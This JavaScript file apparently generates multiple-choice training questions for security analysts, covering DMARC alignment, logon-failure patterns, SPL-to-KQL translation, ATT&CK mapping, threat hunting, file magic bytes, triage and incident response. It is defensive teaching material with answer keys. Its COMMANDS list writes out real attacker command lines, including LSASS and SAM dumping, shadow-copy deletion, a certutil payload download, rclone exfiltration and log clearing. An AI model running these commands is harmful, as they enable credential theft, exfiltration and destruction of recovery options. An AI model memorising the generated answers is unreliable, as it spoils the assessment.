// Parameterised generators for Level 2 skills. DMARC results are computed
// with relaxed alignment (RFC 7489); ATT&CK names are v19 (checked against
// tests/fixtures/attack-enterprise-v19.json by tests/generators.test.js).
import { mc } from './rng.js';
import { closeLen } from './util.js';

// ---------------------------------------------------------------- phishing: DMARC

/** Organisational domain for the .example test domains used here: the last two labels. */
export const orgDomain = (d) => d.split('.').slice(-2).join('.');

/** DMARC verdict with relaxed alignment. Returns one of the RESULT keys below. */
export function dmarcVerdict({ from, spf, mailFrom, dkim, dkimD }) {
  const spfAligned = spf === 'pass' && orgDomain(mailFrom) === orgDomain(from);
  const dkimAligned = dkim === 'pass' && orgDomain(dkimD) === orgDomain(from);
  if (spfAligned && dkimAligned) return 'both';
  if (spfAligned) return 'spf';
  if (dkimAligned) return 'dkim';
  if (spf === 'pass' || dkim === 'pass') return 'unaligned';
  return 'none';
}

const RESULT = {
  both: 'Pass: SPF and DKIM both align with From',
  spf: 'Pass: SPF passes and aligns with From',
  dkim: 'Pass: DKIM passes and aligns with From',
  unaligned: 'Fail: checks pass but none aligns',
  none: 'Fail: SPF and DKIM both failed',
};

const dmarc = {
  id: 'dmarc-eval',
  skill: 'l2-phishing',
  count: 16,
  bloom: 'analyze',
  make(r) {
    const brand = r.pick(['acme', 'northwind', 'contoso', 'fabrikam', 'tailspin']);
    const from = r.pick([`${brand}.example`, `mail.${brand}.example`]);
    const scenario = r.cycle(['spf', 'dkim', 'unaligned', 'none', 'both', 'unaligned', 'dkim', 'spf', 'unaligned', 'none']);
    const esp = r.pick(['bulkmailer.example', 'sendwave.example', 'mailrelay.example']);
    const look = r.pick([`${brand}-payroll.example`, `${brand}-secure.example`, `${brand}1.example`]);
    let spf; let mailFrom; let dkim; let dkimD;
    if (scenario === 'spf') { spf = 'pass'; mailFrom = r.pick([`bounce.${brand}.example`, `${brand}.example`]); dkim = r.pick(['fail', 'none']); dkimD = `${brand}.example`; }
    else if (scenario === 'dkim') { spf = 'pass'; mailFrom = esp; dkim = 'pass'; dkimD = r.pick([`${brand}.example`, `news.${brand}.example`]); }
    else if (scenario === 'both') { spf = 'pass'; mailFrom = `bounce.${brand}.example`; dkim = 'pass'; dkimD = `${brand}.example`; }
    else if (scenario === 'unaligned') { spf = 'pass'; mailFrom = r.pick([look, esp]); dkim = 'pass'; dkimD = r.pick([look, esp]); }
    else { spf = r.pick(['fail', 'softfail']); mailFrom = r.pick([`${brand}.example`, look]); dkim = r.pick(['fail', 'none']); dkimD = `${brand}.example`; }
    const verdict = dmarcVerdict({ from, spf, mailFrom, dkim, dkimD });
    const answer = RESULT[verdict];
    const distractors = Object.entries(RESULT)
      .filter(([k]) => k !== verdict)
      .map(([k, t]) => ({ text: t, mis: verdict === 'unaligned' && k !== 'none' ? 'phish-dmarc-alignment' : undefined }));
    const dkimPart = dkim === 'none' ? 'dkim=none (no signature)' : `dkim=${dkim} header.d=${dkimD}`;
    const why = {
      both: 'Both passing identifiers share the From organisational domain, so DMARC passes twice over.',
      spf: `SPF passed for ${mailFrom}, which shares the organisational domain ${orgDomain(from)} with From, so SPF is aligned. DKIM ${dkim === 'none' ? 'is absent' : 'failed'}, but one aligned pass is enough.`,
      dkim: `SPF passed only for the sending service ${mailFrom}, which does not align with From. DKIM passed with d=${dkimD}, which does align (relaxed: same organisational domain ${orgDomain(from)}), and one aligned pass is enough.`,
      unaligned: `SPF passed for ${mailFrom} and DKIM passed for ${dkimD}, but neither matches the From organisational domain ${orgDomain(from)}. Passing SPF or DKIM for *some other* domain proves nothing about the visible sender.`,
      none: 'Neither SPF nor DKIM passed, so there is nothing to align and DMARC fails.',
    }[verdict];
    return {
      difficulty: verdict === 'unaligned' || verdict === 'dkim' ? 3 : 2,
      ...mc(r, answer, distractors),
      prompt: 'Using DMARC **relaxed alignment**, what is the DMARC result for this message?',
      snippet: `From: "Payroll Team" <payroll@${from}>\nReturn-Path: <bounces@${mailFrom}>\nAuthentication-Results: mx1.example.org;\n   spf=${spf} smtp.mailfrom=${mailFrom};\n   ${dkimPart}`,
      explanation: `DMARC passes when SPF **or** DKIM passes *and* its domain aligns with the From domain (relaxed = same organisational domain). ${why} → **${answer}**.`,
    };
  },
};

// ---------------------------------------------------------------- SIEM: spray vs brute force

const PATTERN = {
  spray: 'Password spraying: one source, many accounts',
  brute: 'Brute force: one account, many guesses',
  stuffing: 'Many sources hitting one account (distributed)',
  normal: 'Normal typos: scattered, low-volume failures',
};

const siemPattern = {
  id: 'siem-pattern',
  skill: 'l2-siem',
  count: 8,
  bloom: 'analyze',
  make(r) {
    const kind = r.cycle(['spray', 'brute', 'stuffing', 'normal']);
    const users = r.sample(['a.chen', 'b.osei', 'c.ruiz', 'd.kowalski', 'e.haddad', 'f.moreau', 'g.tanaka', 'h.silva', 'i.novak', 'j.berg', 'k.adeyemi', 'l.rossi'], 8);
    const ext = () => `203.0.113.${r.int(2, 254)}`;
    const src = ext();
    let rows = [];
    if (kind === 'spray') rows = users.map((u) => [u, src]);
    else if (kind === 'brute') rows = Array.from({ length: 8 }, () => [users[0], src]);
    else if (kind === 'stuffing') rows = Array.from({ length: 8 }, (_, i) => [users[0], `198.51.100.${10 + i * 7 + r.int(0, 5)}`]);
    else rows = users.slice(0, 5).map((u) => [u, `10.20.${r.int(0, 30)}.${r.int(2, 254)}`]);
    let t = r.int(1, 5) * 3600 + r.int(0, 3000);
    const step = kind === 'normal' ? () => r.int(900, 2400) : () => r.int(2, 9);
    const lines = rows.map(([u, s]) => {
      t += step();
      const hh = String(Math.floor(t / 3600)).padStart(2, '0');
      const mm = String(Math.floor((t % 3600) / 60)).padStart(2, '0');
      const ss = String(t % 60).padStart(2, '0');
      return `${hh}:${mm}:${ss}  EventID=4625  TargetUserName=${u}  IpAddress=${s}  Status=0xC000006A`;
    });
    const answer = PATTERN[kind];
    const distractors = Object.entries(PATTERN).filter(([k]) => k !== kind).map(([k, v]) => ({
      text: v,
      mis: (kind === 'spray' && k === 'brute') || (kind === 'brute' && k === 'spray') ? 'siem-spray-vs-brute' : undefined,
    }));
    const why = {
      spray: `one external IP (${src}) tries ${users.length} different accounts once each within seconds: a few common passwords against many users, staying under lockout thresholds (T1110.003).`,
      brute: `one external IP (${src}) hammers the single account ${users[0]} every few seconds: many guesses against one user (T1110.001), which lockout policy usually stops.`,
      stuffing: `one account (${users[0]}) is hit from many different addresses in quick succession: a distributed attack (credential stuffing or a botnet) that defeats per-IP blocking.`,
      normal: 'a handful of internal users each fail once, tens of minutes apart, from their own workstations: that is what everyday typos look like.',
    }[kind];
    return {
      difficulty: kind === 'stuffing' || kind === 'normal' ? 3 : 2,
      ...mc(r, answer, distractors),
      prompt: 'These failed logons (Status 0xC000006A = wrong password) came back from a search. Which pattern fits best?',
      snippet: lines.join('\n'),
      explanation: `Pivot on which field stays constant: ${why} → **${answer}**.`,
    };
  },
};

// ---------------------------------------------------------------- SIEM: SPL ↔ KQL

export const SPL_KQL = [
  ['| stats count by src_ip', '| summarize count() by src_ip'],
  ['| table user, src_ip, action', '| project user, src_ip, action'],
  ['| head 20', '| take 20'],
  ['| stats dc(user) as users by src_ip', '| summarize users = dcount(user) by src_ip'],
  ['| eval mb = bytes / 1048576', '| extend mb = bytes / 1048576'],
  ['| where status = 401', '| where status == 401'],
  ['| rename src_ip as source', '| project-rename source = src_ip'],
  ['| sort - count', '| sort by count_ desc'],
];

const splKql = {
  id: 'spl-kql',
  skill: 'l2-siem',
  count: 8,
  bloom: 'understand',
  make(r) {
    const [spl, kql] = r.cycle(SPL_KQL);
    return {
      difficulty: 2,
      ...mc(r, kql, closeLen(r, kql, SPL_KQL.map((p) => p[1]).filter((k) => k !== kql), 3)),
      prompt: `Your team is moving from Splunk to Microsoft Sentinel. Which KQL line does the same job as the SPL \`${spl}\`?`,
      explanation: `\`${spl}\` → \`${kql}\`. Handy pairs: stats → summarize (count() / dcount()), table → project, eval → extend, head → take, rename → project-rename, and KQL compares with == . In KQL, count() creates a column called count_.`,
    };
  },
};

// ---------------------------------------------------------------- ATT&CK: command → technique

export const COMMANDS = [
  ['vssadmin delete shadows /all /quiet', 'T1490 Inhibit System Recovery'],
  ['procdump.exe -ma lsass.exe out.dmp', 'T1003.001 LSASS Memory'],
  ['reg save HKLM\\SAM C:\\Temp\\s.hiv', 'T1003.002 Security Account Manager'],
  ['ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\n" q q', 'T1003.003 NTDS'],
  ['net group "Domain Admins" /domain', 'T1069.002 Domain Groups'],
  ['nltest /domain_trusts /all_trusts', 'T1482 Domain Trust Discovery'],
  ['wmic /node:10.20.4.17 process call create "cmd /c whoami"', 'T1047 Windows Management Instrumentation'],
  ['certutil -urlcache -f http://203.0.113.9/a.exe a.exe', 'T1105 Ingress Tool Transfer'],
  ['rclone copy D:\\Finance remote:backup --transfers 16', 'T1567.002 Exfiltration to Cloud Storage'],
  ['wevtutil cl Security', 'T1685.005 Clear Windows Event Logs'],
  ['Rubeus.exe kerberoast /outfile:hashes.txt', 'T1558.003 Kerberoasting'],
  ['Rubeus.exe asreproast /format:hashcat', 'T1558.004 AS-REP Roasting'],
  ['7z a -pS3cret C:\\Temp\\out.7z D:\\HR\\*', 'T1560.001 Archive via Utility'],
  ['bcdedit /set {default} recoveryenabled no', 'T1490 Inhibit System Recovery'],
  ['net user /domain', 'T1087.002 Domain Account'],
];

const attackCmd = {
  id: 'attack-cmd',
  skill: 'l2-attack',
  count: 12,
  bloom: 'apply',
  make(r) {
    const [cmd, tech] = r.cycle(COMMANDS);
    const pool = [...new Set(COMMANDS.map((c) => c[1]))].filter((t) => t !== tech);
    return {
      difficulty: tech.startsWith('T1490') || tech.startsWith('T1003.001') ? 1 : 2,
      ...mc(r, tech, closeLen(r, tech, pool, 3)),
      prompt: 'EDR captured this command line. Which ATT&CK (v19) technique does it map to?',
      snippet: cmd,
      explanation: `\`${cmd.split(' ')[0]}\` here is **${tech}**. Map the *behaviour* (what the command achieves), not the tool name: the same binary can serve different techniques depending on its arguments.`,
    };
  },
};

// technique → tactic (single-tactic techniques only, v19 tactic names)
export const TECH_TACTIC = [
  ['T1003.001 LSASS Memory', 'Credential Access'], ['T1087.002 Domain Account', 'Discovery'],
  ['T1105 Ingress Tool Transfer', 'Command and Control'], ['T1567.002 Exfiltration to Cloud Storage', 'Exfiltration'],
  ['T1486 Data Encrypted for Impact', 'Impact'], ['T1021.001 Remote Desktop Protocol', 'Lateral Movement'],
  ['T1560.001 Archive via Utility', 'Collection'], ['T1218.011 Rundll32', 'Stealth'], ['T1070.006 Timestomp', 'Stealth'],
  ['T1685.005 Clear Windows Event Logs', 'Defense Impairment'], ['T1059.001 PowerShell', 'Execution'],
  ['T1190 Exploit Public-Facing Application', 'Initial Access'], ['T1566.002 Spearphishing Link', 'Initial Access'],
  ['T1595 Active Scanning', 'Reconnaissance'], ['T1136.001 Local Account', 'Persistence'],
];
const TACTICS = ['Reconnaissance', 'Resource Development', 'Initial Access', 'Execution', 'Persistence', 'Privilege Escalation', 'Stealth', 'Defense Impairment', 'Credential Access', 'Discovery', 'Lateral Movement', 'Collection', 'Command and Control', 'Exfiltration', 'Impact'];

const attackTactic = {
  id: 'attack-tactic',
  skill: 'l2-attack',
  count: 8,
  bloom: 'understand',
  make(r) {
    const [tech, tactic] = r.cycle(TECH_TACTIC);
    const evasion = tactic === 'Stealth' || tactic === 'Defense Impairment';
    const others = TACTICS.filter((t) => t !== tactic);
    const ds = evasion
      ? [{ text: 'Defense Evasion', mis: 'attack-v19-tactics' }, ...closeLen(r, tactic, others, 4)]
      : closeLen(r, tactic, others, 3);
    return {
      difficulty: evasion ? 3 : 2,
      ...mc(r, tactic, ds),
      prompt: `In ATT&CK Enterprise **v19**, which tactic does **${tech}** belong to?`,
      explanation: `${tech} sits under **${tactic}**. The tactic is the attacker's goal (the *why*); the technique is the method (the *how*).${evasion ? ' v19 split the old Defense Evasion tactic into Stealth (hiding: masquerading, proxy execution, timestomping) and Defense Impairment (breaking defences: disabling tools, clearing logs).' : ''}`,
    };
  },
};

// ---------------------------------------------------------------- hunting: stacking

const hunting = {
  id: 'hunt-stack',
  skill: 'l2-hunting',
  count: 18,
  bloom: 'analyze',
  make(r) {
    const common = r.shuffle([
      ['C:\\Windows\\System32\\svchost.exe', r.int(4800, 5200)],
      ['C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', r.int(900, 990)],
      ['C:\\Windows\\explorer.exe', r.int(990, 1000)],
      ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', r.int(700, 950)],
      ['C:\\Windows\\System32\\RuntimeBroker.exe', r.int(1900, 2100)],
    ]).slice(0, 4);
    const benignRare = r.pick([
      ['C:\\Program Files\\Wireshark\\Wireshark.exe', r.int(3, 6)],
      ['C:\\Program Files\\PuTTY\\putty.exe', r.int(4, 9)],
    ]);
    const evil = r.pick([
      ['C:\\Users\\Public\\svchost.exe', 1],
      ['C:\\ProgramData\\Microsoft\\RuntimeBroker.exe', 1],
      ['C:\\Users\\j.doe\\AppData\\Roaming\\explorer.exe', 2],
      ['C:\\Windows\\Temp\\chrome.exe', 1],
    ]);
    const rows = [...common, benignRare, evil].sort((a, b) => b[1] - a[1]);
    const w = Math.max(...rows.map((x) => String(x[1]).length));
    return {
      difficulty: 2,
      ...mc(r, evil[0], [benignRare[0], ...common.map((c) => c[0])]),
      prompt: 'You stack process image paths across 1,000 workstations (`stats dc(host) by image`). Which row deserves investigation first?',
      snippet: `hosts  image\n${rows.map(([p, n]) => `${String(n).padStart(w)}  ${p}`).join('\n')}`,
      explanation: `Stacking surfaces the long tail, but rarity alone is not guilt: ${benignRare[0].split('\\').pop()} is a rare but legitimate admin tool in Program Files. **${evil[0]}** is both rare and wrong: a Windows process name running from a user-writable folder, the masquerading pattern (T1036.005). Rare + wrong location beats rare alone.`,
    };
  },
};

// ---------------------------------------------------------------- malware: hashes and file magic

const HASHES = [['MD5', 32], ['SHA-1', 40], ['SHA-256', 64], ['SHA-512', 128]];

const hashType = {
  id: 'hash-type',
  skill: 'l2-malware',
  count: 8,
  bloom: 'understand',
  make(r) {
    const [name, len] = r.cycle(HASHES);
    const hex = Array.from({ length: len }, () => '0123456789abcdef'[r.int(0, 15)]).join('');
    return {
      difficulty: 1,
      ...mc(r, name, ['MD5', 'SHA-1', 'SHA-256', 'SHA-512', 'NTLM'].filter((n) => n !== name && !(len === 32 && n === 'NTLM'))),
      prompt: 'A threat-intel report lists this file hash. Which algorithm most likely produced it?',
      snippet: hex,
      explanation: `Count the hex characters: ${len} hex = ${len * 4} bits → **${name}**. MD5 is 32 hex (128 bits), SHA-1 40 (160), SHA-256 64 (256), SHA-512 128 (512). NTLM hashes are also 32 hex, which is why context matters for 32-character values. Prefer SHA-256 when you share IOCs: MD5 and SHA-1 have practical collisions.`,
    };
  },
};

export const MAGIC = [
  ['4D 5A 90 00 03 00 00 00', 'MZ', 'A Windows PE executable'],
  ['7F 45 4C 46 02 01 01 00', '.ELF', 'A Linux ELF executable'],
  ['50 4B 03 04 14 00 06 00', 'PK..', 'A ZIP container (e.g. DOCX)'],
  ['25 50 44 46 2D 31 2E 37', '%PDF-1.7', 'A genuine PDF document'],
  ['D0 CF 11 E0 A1 B1 1A E1', '........', 'A legacy OLE2 Office file'],
  ['89 50 4E 47 0D 0A 1A 0A', '.PNG....', 'A PNG image'],
];
const NAMES = ['invoice_0925.pdf', 'scan_2026-09-25.pdf', 'payslip.docx', 'photo.png', 'quote.xls', 'update.bin'];

const fileMagic = {
  id: 'file-magic',
  skill: 'l2-malware',
  count: 6,
  bloom: 'analyze',
  make(r) {
    const [hex, ascii, what] = r.cycle(MAGIC);
    const name = r.pick(NAMES);
    const claimed = name.endsWith('.pdf') ? 'A genuine PDF document' : name.endsWith('.png') ? 'A PNG image' : name.endsWith('.docx') ? 'A ZIP container (e.g. DOCX)' : name.endsWith('.xls') ? 'A legacy OLE2 Office file' : null;
    const ds = MAGIC.map((m) => m[2]).filter((t) => t !== what).map((t) => ({ text: t, mis: t === claimed ? 'mw-file-type' : undefined }));
    const mismatch = claimed && claimed !== what;
    return {
      difficulty: mismatch ? 2 : 1,
      ...mc(r, what, r.shuffle(ds).sort((a, b) => (b.mis ? 1 : 0) - (a.mis ? 1 : 0))),
      prompt: `A user's download **${name}** starts with these bytes. What is the file really?`,
      snippet: `00000000: ${hex}  ${ascii}`,
      explanation: `The first bytes (the magic number) identify the format, whatever the extension says: **${hex.slice(0, 11)}** = ${what.charAt(0).toLowerCase()}${what.slice(1)}.${mismatch ? ` The name ${name} is lying, a classic lure. Trust the magic bytes (e.g. \`file\` or TrID), not the extension or icon.` : ' Here the name and content agree.'}`,
    };
  },
};

// ---------------------------------------------------------------- triage: priority matrix

const SEV = ['Low', 'Medium', 'High', 'Critical'];
const CRIT = ['Standard workstation', 'Business server', 'Crown jewel (DC, payroll)'];
// MATRIX[critIndex][sevIndex]
export const MATRIX = [
  ['P4', 'P4', 'P3', 'P2'],
  ['P4', 'P3', 'P2', 'P1'],
  ['P3', 'P2', 'P1', 'P1'],
];

const triagePriority = {
  id: 'triage-priority',
  skill: 'l2-alert-triage',
  count: 18,
  bloom: 'apply',
  make(r) {
    const s = r.int(0, 3);
    const c = r.int(0, 2);
    const answer = MATRIX[c][s];
    const host = [`WS-${r.pick(['HR', 'ENG', 'FIN', 'OPS'])}-${r.int(10, 99)}`, `SRV-${r.pick(['APP', 'FILE', 'WEB'])}-${r.int(1, 9)}`, r.pick(['DC01', 'PAYROLL-DB01'])][c];
    const table = ['             Low  Med  High Crit', ...CRIT.map((name, i) => `${name.split(' (')[0].padEnd(13).slice(0, 13)} ${MATRIX[i].map((p) => p.padEnd(4)).join(' ')}`)].join('\n');
    const naive = MATRIX[0][s] === answer ? MATRIX[2][s] : MATRIX[0][s];
    return {
      difficulty: 2,
      ...mc(r, answer, [{ text: naive, mis: 'triage-severity-priority' }, 'P1', 'P2', 'P3', 'P4']),
      prompt: `Using the SOC's priority matrix below, what priority does a **${SEV[s]}**-severity alert on **${host}** (${CRIT[c].toLowerCase()}) get?`,
      snippet: `Priority = severity × asset criticality\n${table}`,
      explanation: `Read the row for the asset (${CRIT[c]}) and the column for the severity (${SEV[s]}): **${answer}**. Priority is not the same as severity: the same detection matters more on a crown-jewel system than on a standard laptop.`,
    };
  },
};


// ---------------------------------------------------------------- IR: phases and containment

const IR_ACTIONS = [
  ['Capture volatile memory from a live beaconing host', 'Containment, Eradication & Recovery', 'ir-evidence-volatile'],
  ['Hold a blameless lessons-learned meeting two weeks later', 'Post-Incident Activity', 'ir-phase-mixup'],
  ['Write the playbook and stock the jump bag before anything happens', 'Preparation', 'ir-phase-mixup'],
  ['Decide whether the alerts add up to a real incident', 'Detection & Analysis', 'ir-phase-mixup'],
  ['Reset every credential that touched the compromised host', 'Containment, Eradication & Recovery', 'ir-creds-forgotten'],
  ['Scope lateral movement before wiping the first host', 'Detection & Analysis', 'ir-eradicate-before-scope'],
  ['Isolate the host with EDR while it stays powered on', 'Containment, Eradication & Recovery', 'ir-evidence-volatile'],
  ['Update detections and the runbook from what you learned', 'Post-Incident Activity', 'ir-phase-mixup'],
  ['Triage SIEM alerts and enrich with EDR process trees', 'Detection & Analysis', 'ir-phase-mixup'],
  ['Rebuild the host from a known-good image after scoping', 'Containment, Eradication & Recovery', 'ir-eradicate-before-scope'],
  ['Train the help desk on how to escalate suspicious mail', 'Preparation', 'ir-phase-mixup'],
  ['Preserve disk images and chain-of-custody paperwork', 'Containment, Eradication & Recovery', 'ir-evidence-volatile'],
];
const IR_PHASES = [...new Set(IR_ACTIONS.map((a) => a[1]))];

const irPhase = {
  id: 'ir-phase',
  skill: 'l2-ir',
  count: 12,
  bloom: 'apply',
  make(r) {
    const [action, phase, mis] = r.cycle(IR_ACTIONS);
    const ds = IR_PHASES.filter((p) => p !== phase).map((p) => ({ text: p, mis }));
    return {
      difficulty: 2,
      ...mc(r, phase, ds),
      prompt: `In the classic NIST SP 800-61 four-phase lifecycle, which phase does this action belong to?`,
      snippet: action,
      explanation: `**${phase}**: ${action.charAt(0).toLowerCase()}${action.slice(1)}. Preparation is before the fire; Detection & Analysis is "is this real and how far?"; Containment/Eradication/Recovery stops the bleed and cleans up; Post-Incident Activity is the lessons-learned loop.`,
    };
  },
};

const CONTAIN = [
  {
    scene: 'A laptop is beaconing to 203.0.113.44 every 60s. Memory may hold the only copy of the implant.',
    answer: 'Isolate with EDR; keep the host powered on',
    wrong: [
      { text: 'Power it off immediately to stop the beacon', mis: 'ir-evidence-volatile' },
      'Reimage it from USB before collecting anything',
      'Ignore it until the nightly backup window',
    ],
    why: 'EDR isolation cuts C2 while the machine stays live so you can capture RAM. Powering off destroys volatile evidence; reimaging before collection destroys disk evidence too.',
  },
  {
    scene: 'Ransomware is encrypting shares from one jump host, and three file servers are already hit.',
    answer: 'Contain the jump host and affected shares first',
    wrong: [
      { text: 'Wipe every file server before scoping who else is infected', mis: 'ir-eradicate-before-scope' },
      'Wait for the encryption to finish so the scope is complete',
      'Reset only the help-desk password and leave the jump host up',
    ],
    why: 'Stop the active damage (contain) on the jumping-off point and shares, then scope, then eradicate. Wiping before you know the blast radius leaves other footholds behind.',
  },
  {
    scene: 'A stolen cloud access key (AKIA…) was used from 198.51.100.17 to call CreateAccessKey and StopLogging.',
    answer: 'Deactivate the key and pause the suspicious trail changes',
    wrong: [
      { text: 'Delete the whole IAM user without checking CloudTrail first', mis: 'ir-eradicate-before-scope' },
      'Rotate only console passwords and leave access keys alone',
      'Ignore StopLogging because trails restart themselves',
    ],
    why: 'Containment for a leaked key is deactivating it (and any keys it created) while you scope CloudTrail. Deleting the user without evidence review burns investigative leads; StopLogging is defense impairment and must be reversed.',
  },
  {
    scene: 'Domain Admin credentials were typed into a phishing page an hour ago; no malware is confirmed yet.',
    answer: 'Reset the DA password and revoke Kerberos tickets',
    wrong: [
      { text: 'Skip credential resets because no malware was found', mis: 'ir-creds-forgotten' },
      'Rebuild every workstation in the OU overnight',
      'Disable MFA so the user can keep working during reset',
    ],
    why: 'Credential incidents need credential containment: reset the password, revoke tickets/sessions, and review privileged groups. Absence of malware does not make a stolen DA password safe.',
  },
];

const irContain = {
  id: 'ir-contain',
  skill: 'l2-ir',
  count: 8,
  bloom: 'evaluate',
  make(r) {
    const c = r.cycle(CONTAIN);
    return {
      difficulty: 3,
      ...mc(r, c.answer, c.wrong),
      prompt: 'You are the incident commander. Which containment step is the best next move?',
      snippet: c.scene,
      explanation: `${c.why} → **${c.answer}**.`,
    };
  },
};

export default [dmarc, siemPattern, splKql, attackCmd, attackTactic, hunting, hashType, fileMagic, triagePriority, irPhase, irContain];
